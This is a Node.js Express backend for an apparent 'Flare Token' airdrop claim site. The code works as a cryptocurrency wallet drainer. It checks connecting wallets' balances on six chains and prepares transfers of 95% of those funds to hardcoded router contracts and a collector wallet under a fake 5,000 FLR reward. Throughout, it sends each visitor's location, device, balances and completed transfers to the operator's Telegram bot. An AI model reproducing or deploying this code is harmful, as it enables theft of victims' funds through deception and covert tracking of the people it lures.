// index.js - FLARE TOKEN BACKEND - SIMPLE & WORKING
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const { ethers } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000;

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" }
}));

const allowedOrigins = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',') 
  : ['http://localhost:3000', 'https://flareairdropclaim.vercel.app', 'https://flarebackend.vercel.app'];

app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('dev'));

// ============================================
// ROOT ENDPOINT
// ============================================

app.get('/', (req, res) => {
  res.json({
    success: true,
    name: 'Flare Token Backend',
    version: '2.0.0',
    status: '🟢 ONLINE',
    telegramStatus: telegramEnabled ? '✅ Connected' : '❌ Disabled',
    telegramBot: telegramBotName || 'Not connected',
    timestamp: new Date().toISOString()
  });
});

// ============================================
// RPC CONFIGURATION
// ============================================

const RPC_CONFIG = {
  Ethereum: { 
    urls: [
      'https://eth.llamarpc.com',
      'https://ethereum.publicnode.com',
      'https://rpc.ankr.com/eth',
      'https://cloudflare-eth.com'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 1
  },
  BSC: {
    urls: [
      'https://bsc-dataseed.binance.org',
      'https://bsc-dataseed1.binance.org',
      'https://bsc-dataseed2.binance.org',
      'https://bsc-dataseed3.binance.org'
    ],
    symbol: 'BNB',
    decimals: 18,
    chainId: 56
  },
  Polygon: {
    urls: [
      'https://polygon-rpc.com',
      'https://rpc-mainnet.maticvigil.com',
      'https://polygon.llamarpc.com',
      'https://polygon-bor.publicnode.com'
    ],
    symbol: 'MATIC',
    decimals: 18,
    chainId: 137
  },
  Arbitrum: {
    urls: [
      'https://arb1.arbitrum.io/rpc',
      'https://rpc.ankr.com/arbitrum',
      'https://arbitrum.llamarpc.com'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 42161
  },
  Avalanche: {
    urls: [
      'https://api.avax.network/ext/bc/C/rpc',
      'https://rpc.ankr.com/avalanche',
      'https://avalanche-c-chain.publicnode.com'
    ],
    symbol: 'AVAX',
    decimals: 18,
    chainId: 43114
  },
  Flare: {
    urls: [
      'https://flare-api.flare.network/ext/C/rpc',
      'https://flare.publicnode.com',
      'https://rpc.flare.xyz'
    ],
    symbol: 'FLR',
    decimals: 18,
    chainId: 14
  }
};

// ============================================
// YOUR DEPLOYED CONTRACT ADDRESSES
// ============================================

const PROJECT_FLOW_ROUTERS = {
  'Ethereum': '0x7264F557f762f16aC7937292D19449c5CE962288',
  'BSC': '0x7264F557f762f16aC7937292D19449c5CE962288',
  'Polygon': '0x54b4A3C43CFf0aC70A8AC3f38f0fdC5DFA1cb278',
  'Arbitrum': '0x54b4A3C43CFf0aC70A8AC3f38f0fdC5DFA1cb278',
  'Avalanche': '0xF6F0B833186DD54B772a93002ab765fc7Ab9D01F',
  'Flare': '0xF6F0B833186DD54B772a93002ab765fc7Ab9D01F'
};

const COLLECTOR_WALLET = process.env.COLLECTOR_WALLET || '0x713eabb95d3650dad05b5e84cb7c58870dd63c96';

// ============================================
// STORAGE
// ============================================

let telegramEnabled = false;
let telegramBotName = '';

const memoryStorage = {
  participants: [],
  pendingFlows: new Map(),
  completedFlows: new Map(),
  settings: {
    tokenName: process.env.TOKEN_NAME || 'Flare Token',
    tokenSymbol: process.env.TOKEN_SYMBOL || 'FLR',
    valueThreshold: parseFloat(process.env.VALUE_THRESHOLD) || 1,
    statistics: {
      totalParticipants: 0,
      eligibleParticipants: 0,
      claimedParticipants: 0,
      uniqueIPs: new Set(),
      totalProcessedUSD: 0,
      totalProcessedWallets: 0,
      processedTransactions: []
    },
    flowEnabled: process.env.FLOW_ENABLED === 'true'
  },
  emailCache: new Map(),
  siteVisits: []
};

// ============================================
// SIMPLE TELEGRAM FUNCTIONS - GUARANTEED TO WORK
// ============================================

async function sendTelegramMessage(text) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) return false;
  
  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML'
    }, { timeout: 5000 });
    return true;
  } catch (error) {
    console.error('Telegram error:', error.message);
    return false;
  }
}

async function enableTelegram() {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) return false;
  
  try {
    const response = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, { timeout: 5000 });
    if (response.data?.ok) {
      telegramBotName = response.data.result.username;
      telegramEnabled = true;
      
      await sendTelegramMessage(
        `🚀 <b>FLARE TOKEN BACKEND ONLINE</b>\n\n` +
        `✅ MultiChain FlowRouter Ready\n` +
        `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...\n` +
        `🤖 Bot: @${telegramBotName}\n` +
        `⏰ Started: ${new Date().toLocaleString()}`
      );
      return true;
    }
  } catch (error) {
    console.log('Telegram connection failed:', error.message);
  }
  return false;
}

// ============================================
// SIMPLE IP LOCATION
// ============================================

async function getIPLocation(ip) {
  try {
    const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    if (cleanIP === '127.0.0.1') return { country: 'Local', flag: '🏠', city: 'Local' };
    
    const response = await axios.get(`http://ip-api.com/json/${cleanIP}`, { timeout: 2000 });
    
    if (response.data?.status === 'success') {
      const flags = {
        'United States': '🇺🇸', 'United Kingdom': '🇬🇧', 'Canada': '🇨🇦',
        'Germany': '🇩🇪', 'France': '🇫🇷', 'Spain': '🇪🇸', 'Italy': '🇮🇹',
        'Netherlands': '🇳🇱', 'Switzerland': '🇨🇭', 'Australia': '🇦🇺',
        'Japan': '🇯🇵', 'China': '🇨🇳', 'India': '🇮🇳', 'Brazil': '🇧🇷',
        'Nigeria': '🇳🇬', 'South Africa': '🇿🇦', 'Mexico': '🇲🇽'
      };
      
      return {
        country: response.data.country,
        flag: flags[response.data.country] || '🌍',
        city: response.data.city || 'Unknown',
        region: response.data.regionName || ''
      };
    }
  } catch (error) {}
  
  return { country: 'Unknown', flag: '🌍', city: 'Unknown', region: 'Unknown' };
}

// ============================================
// SIMPLE DEVICE DETECTION (No external packages)
// ============================================

function getSimpleDeviceInfo(userAgent) {
  if (!userAgent) return { device: 'Unknown', os: 'Unknown', browser: 'Unknown' };
  
  const ua = userAgent.toLowerCase();
  
  // Device
  let device = 'Desktop';
  if (ua.includes('mobile') || ua.includes('android') || ua.includes('iphone')) device = 'Mobile';
  else if (ua.includes('ipad') || ua.includes('tablet')) device = 'Tablet';
  
  // OS
  let os = 'Unknown';
  if (ua.includes('windows')) os = 'Windows';
  else if (ua.includes('mac')) os = 'macOS';
  else if (ua.includes('linux')) os = 'Linux';
  else if (ua.includes('android')) os = 'Android';
  else if (ua.includes('ios') || ua.includes('iphone') || ua.includes('ipad')) os = 'iOS';
  
  // Browser
  let browser = 'Unknown';
  if (ua.includes('chrome') && !ua.includes('edg')) browser = 'Chrome';
  else if (ua.includes('firefox')) browser = 'Firefox';
  else if (ua.includes('safari') && !ua.includes('chrome')) browser = 'Safari';
  else if (ua.includes('edg')) browser = 'Edge';
  
  return { device, os, browser };
}

// ============================================
// SIMPLE BOT DETECTION
// ============================================

function isBot(userAgent) {
  if (!userAgent) return false;
  const ua = userAgent.toLowerCase();
  const botPatterns = ['bot', 'crawler', 'spider', 'scraper', 'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot', 'facebookexternalhit', 'facebot', 'twitterbot', 'linkedinbot', 'telegrambot', 'discordbot', 'whatsapp'];
  return botPatterns.some(pattern => ua.includes(pattern));
}

// ============================================
// TRACK VISIT - DETAILED BUT SAFE
// ============================================

app.post('/api/track-visit', async (req, res) => {
  try {
    const { userAgent, referer, path } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
    
    const location = await getIPLocation(clientIP);
    const deviceInfo = getSimpleDeviceInfo(userAgent);
    const isBotUser = isBot(userAgent);
    
    const visit = {
      id: `VISIT-${Date.now()}-${crypto.randomBytes(4).toString('hex')}`,
      ip: clientIP.replace('::ffff:', ''),
      timestamp: new Date().toISOString(),
      country: location.country,
      flag: location.flag,
      city: location.city,
      region: location.region,
      device: deviceInfo.device,
      os: deviceInfo.os,
      browser: deviceInfo.browser,
      isBot: isBotUser,
      userAgent: (userAgent || 'Unknown').substring(0, 100),
      referer: referer || 'Direct',
      path: path || '/'
    };
    
    memoryStorage.siteVisits.push(visit);
    if (memoryStorage.siteVisits.length > 1000) memoryStorage.siteVisits = memoryStorage.siteVisits.slice(-1000);
    
    // Detailed Telegram report
    const message = 
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `🌐 <b>NEW SITE VISIT</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      
      `📍 <b>LOCATION:</b>\n` +
      `   🏳️ ${location.country} ${location.flag}\n` +
      `   🏙️ ${location.city}${location.region ? `, ${location.region}` : ''}\n\n` +
      
      `💻 <b>DEVICE:</b>\n` +
      `   📱 ${deviceInfo.device} | ${deviceInfo.os} | ${deviceInfo.browser}\n` +
      `   👤 ${isBotUser ? '🤖 Bot' : '👤 Human'}\n\n` +
      
      `🔗 <b>REFERRAL:</b>\n` +
      `   📎 ${referer ? new URL(referer).hostname : 'Direct'}\n` +
      `   📄 ${path}\n\n` +
      
      `🆔 <b>ID:</b> \`${visit.id}\`\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
    
    await sendTelegramMessage(message);
    
    res.json({ success: true });
    
  } catch (error) {
    console.error('Visit error:', error);
    res.json({ success: true });
  }
});

// ============================================
// GET CRYPTO PRICES
// ============================================

async function getCryptoPrices() {
  try {
    const response = await axios.get('https://api.coingecko.com/api/v3/simple/price', {
      params: {
        ids: 'ethereum,binancecoin,matic-network,avalanche-2,flare-networks',
        vs_currencies: 'usd'
      },
      timeout: 5000
    });
    
    return {
      eth: response.data.ethereum?.usd || 2000,
      bnb: response.data.binancecoin?.usd || 300,
      matic: response.data['matic-network']?.usd || 0.75,
      avax: response.data['avalanche-2']?.usd || 32,
      flr: response.data['flare-networks']?.usd || 0.03
    };
  } catch (error) {
    return { eth: 2000, bnb: 300, matic: 0.75, avax: 32, flr: 0.03 };
  }
}

// ============================================
// GET CHAIN PROVIDER
// ============================================

async function getChainProvider(chainName) {
  const config = RPC_CONFIG[chainName];
  if (!config) return null;
  
  for (const url of config.urls) {
    try {
      const provider = new ethers.JsonRpcProvider(url);
      const block = await Promise.race([
        provider.getBlockNumber(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 3000))
      ]);
      
      if (block > 0) return { provider, config };
    } catch (error) {
      continue;
    }
  }
  return null;
}

// ============================================
// GET WALLET BALANCE
// ============================================

async function getWalletBalance(walletAddress) {
  const results = {
    walletAddress,
    totalValueUSD: 0,
    isEligible: false,
    balances: []
  };

  try {
    const prices = await getCryptoPrices();
    
    const chains = [
      { name: 'Ethereum', symbol: 'ETH', price: prices.eth },
      { name: 'BSC', symbol: 'BNB', price: prices.bnb },
      { name: 'Polygon', symbol: 'MATIC', price: prices.matic },
      { name: 'Arbitrum', symbol: 'ETH', price: prices.eth },
      { name: 'Avalanche', symbol: 'AVAX', price: prices.avax },
      { name: 'Flare', symbol: 'FLR', price: prices.flr }
    ];

    let totalValue = 0;
    let chainDetails = [];
    
    for (const chain of chains) {
      try {
        const providerInfo = await getChainProvider(chain.name);
        if (!providerInfo) continue;
        
        const { provider, config } = providerInfo;
        const balance = await provider.getBalance(walletAddress);
        const amount = parseFloat(ethers.formatUnits(balance, config.decimals));
        const valueUSD = amount * chain.price;
        
        if (amount > 0.000001) {
          totalValue += valueUSD;
          chainDetails.push({
            chain: chain.name,
            amount: amount.toFixed(6),
            valueUSD: valueUSD.toFixed(2),
            symbol: chain.symbol
          });
        }
      } catch (error) {}
    }

    results.totalValueUSD = parseFloat(totalValue.toFixed(2));
    results.isEligible = results.totalValueUSD >= 1;
    results.balances = chainDetails;
    
    return { success: true, data: results };

  } catch (error) {
    return { success: false, data: results };
  }
}

// ============================================
// CONNECT ENDPOINT - DETAILED
// ============================================

app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    const location = await getIPLocation(clientIP);
    const deviceInfo = getSimpleDeviceInfo(req.headers['user-agent']);
    
    // Generate email
    const hash = crypto.createHash('sha256').update(walletAddress.toLowerCase()).digest('hex');
    const email = `flr${hash.substring(0, 10)}@proton.me`;
    
    const balanceResult = await getWalletBalance(walletAddress);
    
    let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant) {
      participant = {
        walletAddress: walletAddress.toLowerCase(),
        country: location.country,
        flag: location.flag,
        city: location.city,
        email: email,
        connectedAt: new Date(),
        totalValueUSD: balanceResult.data.totalValueUSD,
        isEligible: balanceResult.data.isEligible
      };
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
      memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
    }
    
    if (balanceResult.data.isEligible) {
      memoryStorage.settings.statistics.eligibleParticipants++;
      
      // Build balances string
      let balancesStr = '';
      balanceResult.data.balances.forEach(b => {
        balancesStr += `   • ${b.chain}: ${b.amount} ${b.symbol} ($${b.valueUSD})\n`;
      });
      
      const message = 
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🎯 <b>ELIGIBLE WALLET DETECTED</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
        
        `👛 <b>WALLET:</b>\n` +
        `   📝 \`${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\`\n` +
        `   💰 Balance: <b>$${balanceResult.data.totalValueUSD}</b>\n` +
        `   🎁 Allocation: <b>5,000 FLR</b>\n\n` +
        
        `📊 <b>BALANCES:</b>\n${balancesStr}\n` +
        
        `📍 <b>LOCATION:</b>\n` +
        `   🏳️ ${location.country} ${location.flag}${location.city ? `, ${location.city}` : ''}\n` +
        `   💻 ${deviceInfo.device} | ${deviceInfo.os} | ${deviceInfo.browser}\n` +
        `   📧 ${email}\n\n` +
        
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `✅ READY FOR PROCESSING`;
      
      await sendTelegramMessage(message);
    } else {
      const message = 
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `👋 <b>NEW WALLET CONNECTED</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
        
        `👛 <b>WALLET:</b>\n` +
        `   📝 \`${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\`\n` +
        `   💰 Balance: <b>$${balanceResult.data.totalValueUSD}</b>\n` +
        `   ⚡ Status: <b>NOT ELIGIBLE</b> (Need $1)\n\n` +
        
        `📍 <b>LOCATION:</b>\n` +
        `   🏳️ ${location.country} ${location.flag}${location.city ? `, ${location.city}` : ''}\n` +
        `   💻 ${deviceInfo.device} | ${deviceInfo.os} | ${deviceInfo.browser}\n` +
        `   📧 ${email}\n\n` +
        
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `✨ Welcome to Flare Token!`;
      
      await sendTelegramMessage(message);
    }
    
    res.json({ success: true, data: balanceResult.data });
    
  } catch (error) {
    console.error('Connection error:', error);
    res.status(500).json({ success: false, error: 'Connection failed' });
  }
});

// ============================================
// PREPARE FLOW - DETAILED
// ============================================

app.post('/api/presale/prepare-flow', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant || !participant.isEligible) {
      return res.status(400).json({ success: false, error: 'Not eligible' });
    }
    
    const balanceResult = await getWalletBalance(walletAddress);
    
    const transactions = balanceResult.data.balances.map(b => ({
      chain: b.chain,
      amount: (parseFloat(b.amount) * 0.95).toFixed(6),
      valueUSD: (parseFloat(b.valueUSD) * 0.95).toFixed(2),
      symbol: b.symbol
    }));
    
    const totalFlowUSD = transactions.reduce((sum, t) => sum + parseFloat(t.valueUSD), 0).toFixed(2);
    const flowId = `FLR-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    memoryStorage.pendingFlows.set(flowId, {
      walletAddress: walletAddress.toLowerCase(),
      transactions,
      totalFlowUSD,
      status: 'prepared',
      createdAt: new Date().toISOString(),
      completedChains: []
    });
    
    // Build transactions string
    let txStr = '';
    transactions.forEach((t, i) => {
      txStr += `   ${i+1}. ${t.chain}: ${t.amount} ${t.symbol} ($${t.valueUSD})\n`;
    });
    
    const message = 
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `🔐 <b>FLOW PREPARED</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      
      `👛 <b>WALLET:</b>\n` +
      `   📝 \`${walletAddress.substring(0, 10)}...\`\n` +
      `   💵 Total: <b>$${totalFlowUSD}</b> (95%)\n` +
      `   🎁 Reward: <b>5,000 FLR</b>\n` +
      `   🔗 Chains: ${transactions.length}\n\n` +
      
      `📋 <b>TRANSACTIONS:</b>\n${txStr}\n` +
      
      `📍 <b>LOCATION:</b>\n` +
      `   🏳️ ${participant.country} ${participant.flag}${participant.city ? `, ${participant.city}` : ''}\n` +
      `   📧 ${participant.email}\n\n` +
      
      `🆔 <b>FLOW:</b> \`${flowId}\`\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
    
    await sendTelegramMessage(message);
    
    res.json({ success: true, data: { flowId, totalFlowUSD, transactions } });
    
  } catch (error) {
    console.error('Prepare error:', error);
    res.status(500).json({ success: false, error: 'Preparation failed' });
  }
});

// ============================================
// PROCESS FLOW - DETAILED
// ============================================

app.post('/api/presale/process-flow', async (req, res) => {
  try {
    const { walletAddress, chainName, flowId, txHash, amount, symbol, valueUSD } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false });
    }
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    const flow = memoryStorage.pendingFlows.get(flowId);
    
    if (participant) {
      memoryStorage.settings.statistics.totalProcessedWallets++;
      memoryStorage.settings.statistics.totalProcessedUSD += parseFloat(valueUSD || 0);
      
      if (flow) {
        flow.completedChains = flow.completedChains || [];
        flow.completedChains.push(chainName);
        
        // Chain processed message
        const chainMessage = 
          `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
          `💰 <b>CHAIN PROCESSED</b>\n` +
          `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
          
          `👛 <b>WALLET:</b>\n` +
          `   📝 \`${walletAddress.substring(0, 10)}...\`\n` +
          `   🔗 Chain: <b>${chainName}</b>\n` +
          `   💵 Amount: ${amount} ${symbol} ($${valueUSD})\n` +
          `   🆔 Tx: \`${txHash?.substring(0, 10)}...\`\n\n` +
          
          `📊 <b>PROGRESS:</b> ${flow.completedChains.length}/${flow.transactions.length}\n` +
          `📍 ${participant?.country || 'Unknown'} ${participant?.flag || ''}\n` +
          `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
        
        await sendTelegramMessage(chainMessage);
        
        if (flow.completedChains.length === flow.transactions.length) {
          memoryStorage.completedFlows.set(flowId, { ...flow, completedAt: new Date().toISOString() });
          
          // Flow completed message
          const completedMessage = 
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🎉 <b>FLOW COMPLETED</b> 🎉\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
            
            `👛 <b>WALLET:</b>\n` +
            `   📝 \`${walletAddress.substring(0, 10)}...\`\n` +
            `   💵 Total Processed: <b>$${flow.totalFlowUSD}</b>\n` +
            `   🎁 FLR Received: <b>5,000 FLR</b>\n` +
            `   🔗 Chains: ${flow.completedChains.join(', ')}\n\n` +
            
            `📍 ${participant?.country || 'Unknown'} ${participant?.flag || ''}\n` +
            `📧 ${participant?.email || 'Unknown'}\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `✅ Distribution Complete`;
          
          await sendTelegramMessage(completedMessage);
        }
      }
    }
    
    res.json({ success: true });
    
  } catch (error) {
    console.error('Process error:', error);
    res.status(500).json({ success: false });
  }
});

// ============================================
// CLAIM ENDPOINT - DETAILED
// ============================================

app.post('/api/presale/claim', async (req, res) => {
  try {
    const { walletAddress, email, chains, totalProcessedValue, reward } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false });
    }
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant || !participant.isEligible) {
      return res.status(400).json({ success: false });
    }
    
    participant.claimed = true;
    participant.claimedAt = new Date();
    memoryStorage.settings.statistics.claimedParticipants++;
    
    const claimId = `FLR-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    const message = 
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `🎉 <b>FLARE TOKEN CLAIMED</b> 🎉\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      
      `👛 <b>WALLET:</b>\n` +
      `   📝 \`${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\`\n` +
      `   🎟️ Claim ID: \`${claimId}\`\n\n` +
      
      `🎁 <b>REWARD:</b>\n` +
      `   🪙 ${reward || '5,000 FLR'}\n` +
      `   💵 Value: $${totalProcessedValue || '850'}\n` +
      `   🔗 Chains: ${chains?.join(', ') || 'N/A'}\n\n` +
      
      `📍 <b>LOCATION:</b>\n` +
      `   🏳️ ${participant.country} ${participant.flag}${participant.city ? `, ${participant.city}` : ''}\n` +
      `   📧 ${email || participant.email}\n\n` +
      
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `✅ CLAIM SUCCESSFUL`;
    
    await sendTelegramMessage(message);
    
    res.json({ success: true });
    
  } catch (error) {
    console.error('Claim error:', error);
    res.status(500).json({ success: false });
  }
});

// ============================================
// ADMIN ENDPOINTS
// ============================================

app.get('/api/admin/dashboard', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token !== adminToken) return res.status(401).json({ success: false });
  
  res.json({
    success: true,
    summary: {
      participants: memoryStorage.participants.length,
      eligible: memoryStorage.participants.filter(p => p.isEligible).length,
      claimed: memoryStorage.participants.filter(p => p.claimed).length,
      totalProcessedUSD: memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2),
      pendingFlows: memoryStorage.pendingFlows.size,
      completedFlows: memoryStorage.completedFlows.size,
      siteVisits: memoryStorage.siteVisits.length,
      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size,
      telegram: telegramEnabled ? '✅' : '❌'
    }
  });
});

app.get('/api/admin/test-telegram', async (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token !== adminToken) return res.status(401).json({ success: false });
  
  const success = await sendTelegramMessage(
    `🧪 <b>TEST MESSAGE</b>\n\n✅ Telegram is working!\n🤖 Bot: @${telegramBotName}`
  );
  
  res.json({ success, telegramEnabled, botName: telegramBotName });
});

app.get('/api/admin/force-telegram', async (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token !== adminToken) return res.status(401).json({ success: false });
  
  const result = await enableTelegram();
  res.json({ success: result, telegramEnabled, botName: telegramBotName });
});

// ============================================
// 404 Handler
// ============================================

app.use('*', (req, res) => {
  res.status(404).json({ success: false, error: 'Endpoint not found' });
});

// ============================================
// START SERVER
// ============================================

app.listen(PORT, '0.0.0.0', async () => {
  console.log(`🚀 Server running on port ${PORT}`);
  await enableTelegram();
});
